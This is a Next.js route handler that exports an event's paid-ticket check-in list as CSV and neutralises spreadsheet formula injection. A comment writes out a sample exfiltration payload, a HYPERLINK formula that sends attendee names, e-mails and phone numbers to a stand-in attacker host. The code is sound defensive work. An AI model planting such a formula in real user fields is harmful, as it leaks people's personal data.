import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { requireAdmin } from "@/lib/authz";
import { parseCuid } from "@/lib/security/ids";

export const dynamic = "force-dynamic";

/**
 * Excel/Sheets evaluate a cell as a formula when it starts with = + - @ (or a
 * leading tab/CR), and they do it even inside a quoted field — so escaping
 * quotes is not enough.
 *
 * `name` here is fully attacker-controlled: registerSchema caps length but
 * allows any charset, and cleanText only strips control characters. Signing up
 * as `=HYPERLINK("https://evil.tld/?d="&A1&C1,"Erro: clique")` fits in 100
 * chars and fires the moment an admin opens the door list — exfiltrating the
 * attendee list (names, e-mails, WhatsApp numbers) of an 18+ dating event.
 *
 * Prefixing with a single quote is the standard mitigation: spreadsheets read
 * the cell as literal text.
 */
function csvCell(value: string): string {
  const neutralized = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
  return `"${neutralized.replace(/"/g, '""')}"`;
}

const genderLabel: Record<string, string> = {
  male: "homem",
  female: "mulher",
};

/** Exports the paid-tickets check-in list of an event as a CSV download. */
export async function GET(
  _req: Request,
  { params }: { params: Promise<{ id: string }> }
) {
  const authz = await requireAdmin();
  if (!authz.ok) {
    return NextResponse.json({ error: authz.error }, { status: 403 });
  }

  const { id: rawEventId } = await params;
  const eventId = parseCuid(rawEventId);
  if (!eventId) {
    return NextResponse.json({ error: "Evento inválido." }, { status: 404 });
  }

  const event = await prisma.event.findFirst({
    where: { id: eventId, organizationId: authz.membership.organizationId },
    select: {
      id: true,
      slug: true,
      tickets: {
        where: { status: "paid" },
        select: {
          id: true,
          checkedInAt: true,
          user: {
            select: { name: true, email: true, phone: true, gender: true },
          },
        },
        orderBy: { user: { name: "asc" } },
      },
    },
  });

  if (!event) {
    return NextResponse.json(
      { error: "Evento não encontrado." },
      { status: 404 }
    );
  }

  const header = [
    "nome",
    "email",
    "whatsapp",
    "genero",
    "status_checkin",
    "checkin_em",
    "ticket_id",
  ].join(",");

  const lines = event.tickets.map((t) =>
    [
      csvCell(t.user.name),
      csvCell(t.user.email),
      csvCell(t.user.phone),
      csvCell(genderLabel[t.user.gender] ?? t.user.gender),
      csvCell(t.checkedInAt ? "feito" : "pendente"),
      csvCell(t.checkedInAt ? t.checkedInAt.toISOString() : ""),
      csvCell(t.id),
    ].join(",")
  );

  // BOM so Excel opens the file as UTF-8.
  const csv = `﻿${[header, ...lines].join("\r\n")}\r\n`;
  const filename = `checkins-${event.slug || event.id}.csv`;

  return new Response(csv, {
    status: 200,
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="${filename}"`,
      "Cache-Control": "no-store",
    },
  });
}
